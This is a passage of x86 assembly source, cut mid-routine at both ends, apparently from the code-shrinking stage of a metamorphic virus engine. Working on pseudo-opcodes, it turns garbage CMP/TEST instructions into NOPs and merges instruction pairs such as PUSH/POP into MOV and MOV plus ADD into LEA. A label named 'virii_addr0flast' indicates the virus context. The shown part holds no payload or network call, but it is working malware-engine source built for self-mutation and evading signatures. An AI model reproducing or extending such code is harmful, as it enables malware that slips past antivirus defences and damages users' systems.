                              mov         ecx, [edi+7]   ; Get the destiny
                              and         ecx, 0FFh
                              cmp         eax, ecx       ; If destiny == index, set ADD
                              jz          Single_Next_LEA_SetADD_2
                              mov         eax, [edi+3]   ; Get the Immediate
                              or          eax, eax       ; If it isn't 0, end
                              jnz         Single_End
Single_Next_LEA_SetMOVRegReg_2:
                              mov         eax, [edi+2]   ; Set MOV Reg,Reg (from LEA Reg,[Reg])
                              mov         ecx, [edi+1]
                              and         ecx, 0FFFFFF00h
                              and         eax, 0FFh
                              add         eax, ecx
                              mov         [edi+1], eax
                              mov         eax, 41h
                              jmp         Single_SetInstruction
Single_Next_LEA_SetADD_2:
                              mov         ecx, [edi+1]     ; Set ADD Reg,Reg (from
                              and         ecx, 0FFFFFF00h  ; LEA Reg,[Reg+Reg2])
                              and         eax, 0FFh
                              add         eax, ecx
                              mov         [edi+1], eax
                              mov         eax, [edi+3]
                              mov         [edi+7], eax
                              xor         eax, eax
                              jmp         Single_SetInstruction
Single_Next_LEA_SetMOV:
                              mov         ecx, 40h      ; Set MOV Reg,Imm (from LEA Reg,[Imm])
                              mov         eax, [edi+7]
                              and         eax, 0FFh
                              mov         ebx, [edi+1]
                              and         ebx, 0FFFFFF00h
                              add         eax, ebx
                              mov         [edi+1], eax
Single_Next_LEA_SetInstructionECX:
                              mov         eax, [edi+3]
                              mov         [edi+7], eax
                              jmp         Single_SetInstructionECX
Single_Next_LEA_CheckADD:
                              mov         eax, [edi+2]  ; Check another possibility for ADD
                              and         eax, 0FFh
                              cmp         eax, 8        ; If Index2 == 8 (not set), set
                              jz          Single_Next_LEA_SetADD     ; ADD Reg,Imm
                              mov         eax, [edi+3]      ; If Index2 != 8 and memory dword
                              or          eax, eax          ; addition is != 0, end
                              jnz         Single_End
Single_Next_LEA_SetADDRegReg:
                              mov         eax, [edi+2]      ; Set ADD Reg,Reg
                              mov         ebx, [edi+1]
                              and         ebx, 0FFFFFF00h
                              and         eax, 0FFh
                              add         eax, ebx
                              mov         [edi+1], eax
Single_Next_LEA_SetADDRegReg_2:
                              mov         eax, 01h          ; Pseudo-opcode of ADD Reg,Reg
                              jmp         Single_SetInstruction
Single_Next_LEA_SetADD:
                              mov         eax, [edi+3]
                              mov         [edi+7], eax  ; Set memory dword addition as the
                              xor         eax, eax      ; Imm to add in ADD Reg,Imm
                              jmp         Single_SetInstruction
Single_Next_LEA_CheckMOVRegReg:
                              mov         eax, [edi+3]  ; If the dword addition is 0, set
                              or          eax, eax      ; MOV Reg,Reg2
                              jnz         Single_End
Single_Next_LEA_SetMOVRegReg:
                              mov         eax, 41h      ; Pseudo-opcode of MOV Reg,Reg
                              jmp         Single_SetInstruction

Single_Next26:
                              cmp         eax, 4Fh      ; MOV Mem,Mem?
                              jnz         Single_Next27
                              mov         esi, [edi+7]  ; If src == dest, set NOP
                              mov         eax, [edi+1]  ; This could be, for example, a
                              cmp         eax, [esi+1]  ; compression of the sequence
                              jnz         Single_End    ; PUSH [EAX+123] / POP [EAX+123]
                              mov         eax, [edi+3]
                              cmp         eax, [esi+3]
                              jz          Single_SetNOP

Single_Next27:
                              cmp         eax, 38h      ; CMP instruction?
                              jb          Single_Next28
                              cmp         eax, 3Ch
                              ja          Single_Next28
Single_Next27_Common:
                              mov     edx, edi     ; Let's get the next instruction. It the
Single_Next27_GetNextInstr:  ; next instruction is not a conditional
                              add         edx, 10h     ; jump, this CMP is a garbage instruction,
                              mov         eax, [edx+0Bh] ; so we NOP it
                              and         eax, 0FFh
                              or          eax, eax
                              jnz         Single_SetNOP
                              mov         eax, [edx]
                              and         eax, 0FFh
                              cmp         eax, 0FFh
                              jz          Single_Next27_GetNextInstr
                              cmp         eax, 70h
                              jb          Single_SetNOP
                              cmp         eax, 7Fh
                              ja          Single_SetNOP
                              jmp         Single_End


Single_Next28:
                              cmp         eax, 38h+80h   ; 8 bits CMP instruction?
                              jb          Single_Next29
                              cmp         eax, 3Ch+80h
                              jbe         Single_Next27_Common

Single_Next29:
                              cmp         eax, 48h       ; Do the same with TEST. A single test
                              jb          Single_Next30  ; (without conditional jump) is garbage
                              cmp         eax, 4Ch       ; for sure.
                              jbe         Single_Next27_Common

Single_Next30:
                              cmp         eax, 48h+80h   ; 8 bits TEST instruction?
                              jb          Single_Next31
                              cmp         eax, 4Ch+80h
                              jbe         Single_Next27_Common

Single_Next31:

Single_End:
;; Once here we check if it's a 8 bits instruction. If it's the case,
;; we save for later the register it's using (concretely, for register
;; translation). The last one stored here is the one we are using along
;; the engine.

                              mov         eax, [edi]   ; Get the instruction
                              and         eax, 0FFh
                              cmp         eax, 80h+00  ; Check if it's a 8 bits opcode
                              jb          Check_Double
                              cmp         eax, 80h+4Ch
                              ja          Check_Double
                              and         eax, 7
                              or          eax, eax     ; If it is, check if it's MOV Reg,Imm,
                              jz          GetFrom_RegImm
                              cmp         eax, 1       ; MOV Reg,Reg,
                              jz          GetFrom_RegReg
                              cmp         eax, 2       ; MOV Reg,Mem or
                              jz          GetFrom_RegMem
                              cmp         eax, 3       ; MOV Mem,Reg, and then we get the
                              jnz         Check_Double ; register and save it, having then
GetFrom_MemReg:              ; the 8 bits register that we are using
GetFrom_RegMem:              ; along the code. This register must be
GetFrom_RegReg:              ; treated specially by the register
                              mov         eax, [edi+7] ; translator of the expander, because must
                              and         eax, 0FFh    ; be one of the general use registers
                              jmp         GetFrom_OK   ; (EAX, ECX, EDX and EBX)
GetFrom_RegImm:
                              mov     eax, [edi+1]
                              and     eax, 0FFh
GetFrom_OK:
                              mov     [ebp+Register8Bits], eax ; Save the register


;;; Pairs of instructions. We try to match known pairs to merge them to the
;;; simple one-instruction form.
Check_Double:
                              mov         esi, edi
                              call        IncreaseEIP   ; Increase pointer and get the second
                              cmp         edi, [ebp+virii_addr0flast] ; instruction.
                              jz          EndNoCompressed
                              mov         eax, [edi+0Bh]
                              and         eax, 0FFh
                              or          eax, eax
                              jnz         EndNoCompressed ; We don't join instructions with
                                                ; labels on them.
                        ;; Pair to check is at <[esi],[edi]>

                              mov         eax, [esi]
                              and         eax, 0FFh
                              cmp         eax, 68h     ; Check pair with PUSH Imm
                              jnz         Double_Next00
                              mov         eax, [edi]
                              and         eax, 0FFh
                              cmp         eax, 58h     ; PUSH Imm/POP Reg?
                              jz          Double_Next_PutMOVRegImm
                              cmp         eax, 59h     ; PUSH Imm/POP Mem?
                              jnz         EndNoCompressed
Double_Next_PutMOVMemImm:
                              mov         eax, [edi+1]
                              mov         [esi+1], eax
                              mov         eax, [edi+3]
                              mov         [esi+3], eax
                              mov         eax, 44h     ; Set MOV Mem,Imm
                              jmp         Double_Next_SetInstruction
Double_Next_PutMOVRegImm:
                              mov     eax, [edi+1]
                              mov     [esi+1], eax
                              mov     eax, 40h     ; Set MOV Reg,Imm
Double_Next_SetInstruction:
                              mov     ebx, [esi]
                              and     ebx, 0FFFFFF00h
                              and     eax, 0FFh
                              add     eax, ebx
                              mov     [esi], eax
Double_Next_SetNOP:
                              mov         eax, 0FFh    ; Set NOP at second instruction
                              mov         [edi], al
                              jmp         EndCompressed

Double_Next00:
                              ;mov        al, [esi]
                              cmp         eax, 50h     ; Check pair beginning with PUSH Reg
                              jnz         Double_Next01
                              mov         eax, [edi]
                              and         eax, 0FFh
                              cmp         eax, 58h     ; PUSH Reg/POP Reg?
                              jz          Double_Next_PushPop
                              cmp         eax, 0FEh    ; PUSH Reg/RET?
                              jz          Double_Next00_JMPReg
                              cmp         eax, 59h     ; PUSH Reg/POP Mem?
                              jnz         Double_End
                              mov         eax, [esi+1]
                              mov         ebx, [esi+7]
                              and         ebx, 0FFFFFF00h
                              and         eax, 0FFh
                              add         eax, ebx
                              mov         [esi+7], eax
                              mov         eax, [edi+1]
                              mov         [esi+1], eax
                              mov         eax, [edi+3]
                              mov         [esi+3], eax
                              mov         eax, 43h     ; If PUSH Reg/POP Mem, set MOV Mem,Reg
                              jmp         Double_Next_SetInstruction
Double_Next_PushPop:
                              mov       eax, [edi+1]
                              mov       [esi+7], eax
                              mov       eax, 41h     ; If PUSH Reg/POP Reg, set MOV Reg,Reg
                              jmp       Double_Next_SetInstruction
Double_Next00_JMPReg:
                              mov       eax, 0EDh    ; If PUSH Reg/RET, set JMP Reg
                              jmp       Double_Next_SetInstruction

Double_Next01:
                              ;mov      al, [esi]
                              cmp       eax, 51h     ; Check pair beginning with PUSH Mem
                              jnz       Double_Next02
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 58h     ; PUSH Mem/POP Reg?
                              jz        Double_Next01_PushPop
                              cmp       eax, 59h     ; PUSH Mem/POP Mem?
                              jnz       Double_End
Double_Next01_MOVMemMem:
                              mov       [esi+7], edi
                              mov       [edi+7], esi
                              mov       eax, 4Fh     ; If PUSH Mem/POP Mem, MOV Mem,Mem
                              jmp       Double_Next_SetInstruction
Double_Next01_PushPop:
                              mov       eax, [edi+1]
                              mov       ebx, [edi+1]
                              and       ebx, 0FFFFFF00h
                              and       eax, 0FFh
                              add       eax, ebx
                              mov       [esi+7], eax
                              mov       eax, 42h     ; If PUSH Mem/POP Reg, set MOV Reg,Mem
                              jmp       Double_Next_SetInstruction

Double_Next02:
                              mov       eax, [esi+1]
                              cmp       eax, [edi+1]
                              jnz       Double_Next_NoMem
                              mov       eax, [esi+3]    ; If bytes from +1 to +6 coincides,
                              cmp       eax, [edi+3]    ; it can be a memory operation with
                              jnz       Double_Next_NoMem ; the same memory variable. If not,
                                                      ; just jump to check other things

        ; From now and while we are checking memory variable using instructions,
        ; we are sure that they use the same memory variable.
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 0F6h       ; Check if it's APICALL_STORE
                              jz        Double_Next02_Check   ; If it is, jump (it's just like
                                                            ; a MOV Mem,Reg)
                              cmp       eax, 43h        ; MOV Reg,Mem?
                              jnz       Double_Next03
Double_Next02_Check:
                              mov       eax, [edi]     ; Get the second instruction
                              and       eax, 0FFh
                              cmp       eax, 51h       ; PUSH Mem?
                              jz        Double_Next02_PushReg
                              cmp       eax, 4Ch       ; OP Mem,Imm?
                              jbe       Double_Next_OPRegReg
                              cmp       eax, 0EAh      ; CALL Mem?
                              jz        Double_Next02_CALLMem
                              cmp       eax, 0EBh      ; JMP Mem?
                              jnz       Double_End
Double_Next02_JMPMem:
                              mov       eax, 0EDh      ; MOV Mem,Reg + JMP Mem = JMP Reg
Double_Next02_XXXMem:
                              push      eax
                              mov       eax, [esi+7]
                              mov       ebx, [esi+1]
                              and       ebx, 0FFFFFF00h
                              and       eax, 0FFh
                              add       eax, ebx
                              mov       [esi+1], eax
                              pop       eax
                              jmp       Double_Next_SetInstruction
Double_Next02_CALLMem:
                              mov       eax, 0ECh      ; MOV Mem,Reg + CALL Mem = CALL Reg
                              jmp       Double_Next02_XXXMem
Double_Next_OPRegReg:
                              and       eax, 7Fh       ; Check operation
                              cmp       eax, 3Bh       ; Check for CMP Mem,Reg
                              jz        Double_Next02_MergeCheck ; If it is, merge the check
                              cmp       eax, 4Bh       ; Check for TEST Mem,Reg
                              jz        Double_Next02_MergeCheck ; If it is, merge
                              cmp       eax, 4Ah       ; Check for TEST Reg,Mem (in fact, the
                              jz        Double_Next02_MergeCheck ; same x86 opcode)
                              and       eax, 7
                              cmp       eax, 2         ; Check for OP Reg,Mem
                              jnz       Double_End     ; If not, finish
                              mov       eax, [esi+7]   ; If so, merge it:
                              mov       [esi+1], eax   ; MOV Mem,Reg + OP Reg,Mem = OP Reg,Reg
                              mov       eax, [edi+7]   ; We don't care about the two registers
                              mov       [esi+7], eax   ; being equal, because that is going to
                                                ; be checked by the scanning of single
                                                ; instructions
Double_Next02_SetOP:
                              mov       eax, [edi]     ; Get the OP
                              and       eax, 0F8h      ; Transform it to OP Reg,Reg
                              add       eax, 1
                              jmp       Double_Next_SetInstruction
Double_Next02_MergeCheck:
                              mov       eax, [edi+7]
                              mov       [esi+1], eax   ; Merge the check (if CMP/TEST Reg,Mem)
                              jmp       Double_Next02_SetOP
Double_Next02_PushReg:
                              mov       eax, [esi+7]
                              mov       [esi+1], eax
                              mov       eax, 50h       ; MOV Mem,Reg/PUSH Mem = PUSH Reg
                              jmp       Double_Next_SetInstruction

Double_Next03:
                              ;mov      al, [esi]
                              cmp       eax, 0C3h   ; Check pair beginning with MOV Mem8,Reg8
                              jnz       Double_Next04
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 00h+80h  ; Check if it's a normal operation
                              jb        Double_End    ; (pseudo-opcodes 80-CC)
                              cmp       eax, 4Ch+80h
                              jbe       Double_Next_OPRegReg
                              jmp       Double_End

Double_Next04:
                              cmp       eax, 44h    ; Check if it begins with MOV Mem,Imm
                              jnz       Double_Next05
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 51h    ; PUSH Mem?
                              jz        Double_Next04_PushImm ; Set PUSH Imm
                              cmp       eax, 4Ch
                              ja        Double_Next05
                              and       eax, 7
                              cmp       eax, 2         ; OP Reg,Mem?
                              jnz       Double_Next05  ; If not, check next pair
Double_Next_Merge_MOV_OP:
                              mov       eax, [edi+7]
                              mov       ebx, [esi+1]
                              and       ebx, 0FFFFFF00h
                              and       eax, 0FFh
                              add       eax, ebx
                              mov       [esi+1], eax
                              mov       eax, [edi]
                              and       eax, 0F8h   ; MOV Mem,Imm + OP Reg,Mem = OP Reg,Imm
                              jmp       Double_Next_SetInstruction
Double_Next04_PushImm:
                              mov       eax, 68h    ; MOV Mem,Imm + PUSH Mem = PUSH Imm
                              jmp       Double_Next_SetInstruction

Double_Next05:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 44h+80h  ; Same as above, but 8 bits operations
                              jnz       Double_Next06
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 00h+80h
                              jb        Double_Next06
                              cmp       eax, 4Ch+80h
                              ja        Double_Next06
                              and       eax, 7
                              cmp       eax, 2
                              jnz       Double_Next06
                              jmp       Double_Next_Merge_MOV_OP

Double_Next06:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 59h     ; POP Mem?
                              jnz       Double_Next_NoMem
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 42h     ; POP Mem + MOV Reg,Mem?
                              jz        Double_Next06_POPReg
                              cmp       eax, 4Fh     ; POP Mem + MOV Mem,Mem?
                              jz        Double_Next06_POPMem
                              cmp       eax, 51h     ; POP Mem + PUSH Mem?
                              jz        Double_Next_SetDoubleNOP
                              cmp       eax, 0EBh    ; POP Mem + JMP Mem?
                              jnz       Double_Next_NoMem
                              mov       eax, 0FEh    ; POP Mem + JMP Mem = RET
                              jmp       Double_Next_SetInstruction
Double_Next06_POPReg:
                              mov       eax, [edi+7]
                              mov       [esi+1], eax
                              mov       eax, 58h     ; POP Mem + MOV Reg,Mem = POP Reg
                              jmp       Double_Next_SetInstruction
Double_Next06_POPMem:
                              mov       ebx, [edi+7]
                              mov       eax, [ebx+1]
                              mov       [esi+1], eax
                              mov       eax, [ebx+3]
                              mov       [esi+3], eax ; POP Mem + MOV Mem2,Mem = POP Mem2
                              jmp       Double_Next_SetNOP
      Double_Next_SetDoubleNOP:
                              mov       eax, 0FFh    ; POP Mem + PUSH Mem = NOP
                              jmp       Double_Next_SetInstruction


Double_Next_NoMem:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 40h       ; MOV Reg,Imm?
                              jnz       Double_Next07
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 42h+80h   ; MOV Reg,Imm + MOV Reg8,Mem8?
                              jz        Double_Next06_MaybeMOVZX
                              cmp       eax, 1         ; MOV Reg,Imm + ADD Reg,Reg?
                              jnz       Double_Next07
                              mov       eax, [esi+1]   ; MOV Reg,Imm + ADD Reg,Reg2 =
                              and       eax, 0FFh      ; = LEA Reg,[Reg2+Imm]
                              mov       ebx, [edi+7]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next07
                              mov       eax, [esi+7]
                              mov       [esi+3], eax
                              mov       eax, [esi+1]
                              mov       [esi+7], eax
                              mov       eax, [edi+1]
                              and       eax, 0FFh
                              mov       ebx, [esi+1]
                              and       ebx, 0FFFFFF00h
                              add       eax, ebx
                              mov       [esi+1], eax
Double_Next06_SetLEA:
                              mov       eax, [esi+2]
                              and       eax, 0FFFFFF00h
                              add       eax, 8
                              mov       [esi+2], eax
                              mov       eax, 0FCh
                              jmp       Double_Next_SetInstruction
Double_Next06_MaybeMOVZX:
                              mov       eax, [esi+7]
                              or        eax, eax
                              jnz       Double_Next07
                              mov       eax, [esi+1]
                              and       eax, 0FFh
                              mov       ebx, [edi+7]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next07
                              mov       ebx, [edi+1]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jz        Double_Next07
                              mov       ebx, [edi+2]
                              and       ebx, 0Fh
                              cmp       eax, ebx
                              jz        Double_Next07
                              mov       [esi+7], eax
                              mov       eax, [edi+1]
                              mov       [esi+1], eax
                              mov       eax, [edi+3]
                              mov       [esi+3], eax
                              mov       eax, 0F8h   ; MOV Reg,0+MOV Reg8,Mem8=MOVZX Reg,Mem8
                              jmp       Double_Next_SetInstruction

Double_Next07:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 41h    ; MOV Reg,Reg?
                              jnz       Double_Next08
                              mov       eax, [edi]
                              and       eax, 0FFh
                              or        eax, eax    ; MOV Reg,Reg + ADD Reg,Imm?
                              jz        Double_Next07_LEA01
                              cmp       eax, 1      ; MOV Reg,Reg + ADD Reg,Reg?
                              jnz       Double_Next08
                              mov       eax, [esi+7]
                              and       eax, 0FFh
                              mov       ebx, [edi+7]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next08
                              mov       eax, [edi+1]
                              mov       [esi+2], eax
                              xor       eax, eax
                              mov       [esi+3], eax    ; MOV Reg,Reg2 + ADD Reg,Reg3 =
                              mov       eax, 0FCh       ; = LEA Reg,[Reg2+Reg3]
                              jmp       Double_Next_SetInstruction
Double_Next07_LEA01:
                              mov       eax, [esi+7]
                              and       eax, 0FFh
                              mov       ebx, [edi+1]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next08
                              mov       eax, [edi+7]  ; MOV Reg,Reg2 + ADD Reg,Imm =
                              mov       [esi+3], eax  ; = LEA Reg,[Reg2+Imm]
                              jmp       Double_Next06_SetLEA

Double_Next08:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              or        eax, eax      ; ADD Reg,Imm?
                              jnz       Double_Next09
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 01h      ; ADD Reg,Imm + ADD Reg,Reg2?
                              jnz       Double_Next09
                              mov       eax, [esi+1]
                              and       eax, 0FFh
                              mov       ebx, [edi+7]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next09
                              mov       eax, [edi+1]
                              mov       [esi+2], eax
                              mov        eax, [esi+7]
                              mov       [esi+3], eax
                              mov       eax, [esi+1]
                              mov       [esi+7], eax
                              mov       eax, 0FCh     ; Merge to LEA
                              jmp       Double_Next_SetInstruction

Double_Next09:
                              mov       eax, [esi]
                              and       eax, 0FFh
                              cmp       eax, 01h      ; ADD Reg,Reg?
                              jnz       Double_Next10
                              mov       eax, [edi]
                              and       eax, 0FFh
                              or        eax, eax      ; ADD Reg,Imm?
                              jnz       Double_Next10
                              mov       eax, [esi+7]
                              cmp       al, [edi+1]
                              jnz       Double_Next10
                              mov       eax, [esi+1]
                              mov       [esi+2], al
                              mov       eax, [esi+7]
                              mov       [esi+1], al
                              mov       eax, [edi+7]
                              mov       [esi+3], eax
                              mov       eax, 0FCh     ; Merge to LEA
                              jmp       Double_Next_SetInstruction

Double_Next10:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 4Ch      ; Generic OP?
                              ja        Double_Next11
                              mov       al, [edi]
                              cmp       eax, 4Ch      ; Generic OP + Generic OP?
                              ja        Double_Next11
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 4        ; OP Mem,Imm + Generic OP?
                              jz        Double_Next10_OPMemImm
                              or        eax, eax      ; OP Reg,Imm + Generic OP?
                              jnz       Double_Next11
Double_Next10_OPRegImm:
                              mov       eax, [edi]
                              and       eax, 7
                              or        eax, eax      ; OP Reg,Imm + OP Reg,Imm?
                              jnz       Double_Next11
                              mov       eax, [esi+1]
                              cmp       al, [edi+1]   ; 1st Reg == 2nd Reg?
                              jnz       Double_Next11
                              xor       ebx, ebx
Double_Next_CalculateOperation:
                              push      ebx
                              mov       ecx, [esi+7]
                              mov       edx, [edi+7]
Double_Next_CalculateOperation_2:
                              mov       eax, [edi]
                              and       eax, 78h      ; Get 2nd OP
                              mov       ebx, eax
                              mov       eax, [esi]
                              and       eax, 78h      ; Get 1st OP
                              call      CalculateOperation ; Merge the operations
                              pop       ebx
                              cmp       eax, 0FEh     ; Can be merged?
                              jz        Double_End    ; If not, check triplet
                              cmp       eax, 0FFh     ; OP Reg,Imm + MOV Reg,Imm?
                              jz        Double_Next_SetNOPAt1st ; Then, eliminate first
                              mov       [esi+7], ecx
                              add       eax, ebx      ; Set merged operation
                              jmp       Double_Next_SetInstruction
Double_Next_SetNOPAt1st:
                              mov       eax, 0FFh     ; Set NOP at first instruction
                              mov       [esi], al
                              jmp       EndCompressed ; Return with success
Double_Next10_OPMemImm:
                              mov       eax, [edi]
                              and       eax, 7
                              cmp       eax, 4        ; OP Mem,Imm + OP Mem,Imm?
                              jnz       Double_Next11
                              mov       eax, [esi+1]
                              cmp       eax, [edi+1]  ; Are mem operands the same?
                              jnz       Double_Next11
                              mov       eax, [esi+3]
                              cmp       eax, [edi+3]
                              jnz       Double_Next11
                              mov       ebx, 4        ; If so, jump to try merging OPs
                              jmp       Double_Next_CalculateOperation

Double_Next11:
                              xor       eax, eax
                              mov       al, [esi]     ; Do the same as above, but with
                              cmp       eax, 00h+80h  ; 8 bits operations
                              jb        Double_Next12
                              cmp       eax, 4Ch+80h
                              ja        Double_Next12
                              mov       al, [edi]
                              cmp       eax, 00h+80h
                              jb        Double_Next12
                              cmp       eax, 4Ch+80h
                              ja        Double_Next12
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 4
                              jz        Double_Next11_OPMemImm_8b
                              or        eax, eax
                              jnz       Double_Next12
Double_Next11_OPRegImm_8b:
                              mov       eax, [edi]
                              and       eax, 7
                              or        eax, eax
                              jnz       Double_Next12
                              mov       ebx, 80h
Double_Next11_CalculateOperation_8b:
                              push      ebx
                              xor       eax, eax
                              mov       al, [esi+7]
                              mov       ecx, eax
                              mov       al, [edi+7]
                              mov       edx, eax
                              jmp       Double_Next_CalculateOperation_2
Double_Next11_OPMemImm_8b:
                              mov       eax, [edi]
                              and       eax, 7
                              cmp       eax, 4
                              jnz       Double_Next12
                              mov       eax, [esi+1]
                              cmp       eax, [edi+1]
                              jnz       Double_Next12
                              mov       eax, [esi+3]
                              cmp       eax, [edi+3]
                              jnz       Double_Next12
                              mov       ebx, 84h
                              jmp       Double_Next11_CalculateOperation_8b

Double_Next12:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 0FCh     ; LEA?
                              jnz       Double_Next13
                              mov       al, [edi]
                              cmp       eax, 01h      ; LEA + ADD Reg,Reg?
                              jz        Double_Next12_MergeLEAADDReg
                              or        eax, eax      ; LEA + ADD Reg,Imm?
                              jnz       Double_Next13
Double_Next12_MergeLEAADD:
                              mov       eax, [esi+7]  ; Check if destiny in LEA is the same
                              cmp       al, [edi+1]   ; as destiny in ADD
                              jnz       Double_Next13
                              mov       eax, [edi+7]  ; If so, add the Imm of the ADD to the
                              add       [esi+3], eax  ; dword addition in the LEA and set
                              jmp       Double_Next_SetNOP ; NOP at first instruction
Double_Next12_MergeLEAADDReg:
                              mov       eax, [esi+7]
                              cmp       al, [edi+7]   ; Check if destinies are the same
                              jnz       Double_Next13
                              mov       eax, 8
                              cmp       al, [esi+1]   ; Look for a free space to insert the
                              jz        Double_Next12_SetFirstReg ; register addition in the
                              cmp       al, [esi+2]               ; LEA
                              jz        Double_Next12_SetSecondReg
                              mov       eax, [edi+1]  ; If the register is already inserted,
                              cmp       al, [esi+2]   ;  set a *2 in the multiplicator
                              jz        Double_Next12_AddScalar
                              cmp       al, [esi+1]
                              jnz       Double_Next13
                              mov       eax, [esi+2]
                              cmp       al, 40h       ; If multiplicator is already *2 or
                              jae       Double_Next13 ;  greater, don't shrink
                              push      eax           ; Exchange registers, to set the one
                              mov       eax, [esi+1]  ;  repeated in the second slot of the
                              add       eax, 40h      ;  indexes.
                              mov       [esi+2], al   ; Set *2
                              pop       eax
                              mov       [esi+1], al
                              jmp       Double_Next_SetNOP ; Eliminate first instruction
Double_Next12_AddScalar:
                              mov       eax, [esi+2]  ; Set *2 to the second index
                              add       eax, 40h
                              mov       [esi+2], al
                              jmp       Double_Next_SetNOP
Double_Next12_SetFirstReg:
                              mov       eax, [edi+1] ; Set a new index register
                              mov       [esi+1], al
                              jmp       Double_Next_SetNOP
Double_Next12_SetSecondReg:
                              mov       eax, [edi+1] ; Set a new second index register
                              mov       [esi+2], al
                              jmp       Double_Next_SetNOP

Double_Next13:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 4Fh     ; MOV Mem,Mem?
                              jnz       Double_Next14
                              mov       al, [edi]
                              cmp       eax, 4Fh     ; MOV Mem,Mem2 + MOV Mem2,Mem3?
                              jz        Double_Next13_MergeMOVs ; Then, merge them
                              cmp       eax, 4Ch
                              ja        Double_Next13_NotOPRegMem
Double_Next13_OPRegMem_2:
                              and       eax, 7
                              cmp       eax, 2       ; MOV Mem,Mem2 + OP Reg,Mem?
                              jz        Double_Next13_OPRegMem
                              mov       al, [edi]
                              jmp       Double_Next13_NotOPRegMem2
Double_Next13_NotOPRegMem:
                              cmp       eax, 00h+80h ; Same with 8 bits?
                              jb        Double_Next13_NotOPRegMem2
                              cmp       eax, 4Ch+80h
                              jbe       Double_Next13_OPRegMem_2
Double_Next13_NotOPRegMem2:
                              cmp       eax, 43h     ; Merge MOVs
                              jz        Double_Next13_MOVMemReg
                              cmp       eax, 0F6h    ; APICALL_STORE = MOV Mem,EAX
                              jz        Double_Next13_MOVMemReg
                              cmp       eax, 44h     ; MOV Mem,Mem2 + MOV Mem2,Imm?
                              jz        Double_Next13_MOVMemImm
                              cmp       eax, 0EAh    ; MOV Mem,Mem2 + CALL Mem?
                              jz        Double_Next13_CALLMem
                              cmp       eax, 0EBh    ; MOV Mem,Mem2 + JMP Mem?
                              jnz       Double_Next14
Double_Next13_JMPMem:
Double_Next13_CALLMem:
Double_Next13_OPRegMem:
                              mov       ebx, [esi+7]  ; Merge Mem operands
                              mov       eax, [ebx+1]
                              cmp       eax, [edi+1]
                              jnz       Double_Next14
                              mov       eax, [ebx+3]
                              cmp       eax, [edi+3]
                              jnz       Double_Next14
                              mov       eax, [esi+1]
                              mov       [edi+1], eax
                              mov       eax, [esi+3]
                              mov       [edi+3], eax
                              jmp       Double_Next_SetNOPAt1st
Double_Next13_MergeMOVs:
                              mov       ebx, [esi+7] ; MOV Mem,Mem2 + MOV Mem2,Mem3 =
                              mov       eax, [ebx+1] ; = MOV Mem,Mem3
                              cmp       eax, [edi+1]
                              jnz       Double_Next14
                              mov       eax, [ebx+3]
                              cmp       eax, [edi+3]
                              jnz       Double_Next14
                              mov       eax, [edi+7]
                              mov       [esi+7], eax
                              mov       [eax+7], esi
                              jmp       Double_Next_SetNOP
Double_Next13_MOVMemReg:
Double_Next13_MOVMemImm:
                              mov       ebx, [esi+7]  ; MOV Mem,Mem2 + MOV Mem2,Reg/Imm =
                              mov       eax, [ebx+1]  ; = MOV Mem,Reg/Imm
                              cmp       eax, [edi+1]
                              jnz       Double_Next14
                              mov       eax, [ebx+3]
                              cmp       eax, [edi+3]
                              jz        Double_Next_SetNOPAt1st

Double_Next14:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 70h     ; Jcc?
                              jb        Double_Next15
                              cmp       eax, 7Fh
                              ja        Double_Next15
                              mov       al, [edi]
                              cmp       eax, 0E9h    ; Jcc + JMP?
                              jz        Double_Next14_CheckJMP
                              cmp       eax, 70h
                              jb        Double_Next15
                              cmp       eax, 7Fh     ; Jcc + Jcc?
                              ja        Double_Next15
                              mov       eax, [edi+1] ; Check if they point to the next
                              cmp       eax, [esi+1] ; label
                              jnz       Double_Next15
                              mov       eax, [esi]
                              and       eax, 0Fh
                              mov       ebx, eax
                              mov       eax, [edi]
                              and       eax, 0Fh
                              ; EAX = Flag test 1
                              ; EBX = Flag test 2
                              call      GetRealCheck ; Merge the flag checking
                              cmp       eax, 0FFh
                              jz        Double_End
                              add       eax, 70h     ; Add 70 to the result
                              cmp       eax, 0E9h    ; If Jcc + Jcc == JMP, set it, and jump
                              jz        Double_Next32_JMP ; to eliminate the code until the
                                                      ; next label
                              jmp       Double_Next_SetInstruction
Double_Next14_CheckJMP:
                              mov       eax, [edi+1] ; Jcc @123 + JMP @123 = JMP @123
                              cmp       eax, [esi+1]
                              jz        Double_Next_SetNOPAt1st
                              jmp       Double_End

Double_Next15:
    ;                 mov     edx, 40h
    ;                 call    Check_OP_MOV
    ;                 cmp     eax, 0FFh               ; This makes many problems!
    ;                 jz    @@Double_Next_SetNOPAt1st ;
                                                    ; Disabled.
Double_Next16:
    ;                 mov     edx, 0C0h
    ;                 call    Check_OP_MOV
    ;                 cmp     eax, 0FFh
    ;                 jz    @@Double_Next_SetNOPAt1st

Double_Next17:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 0E0h    ; NOT Reg?
                              jnz       Double_Next18
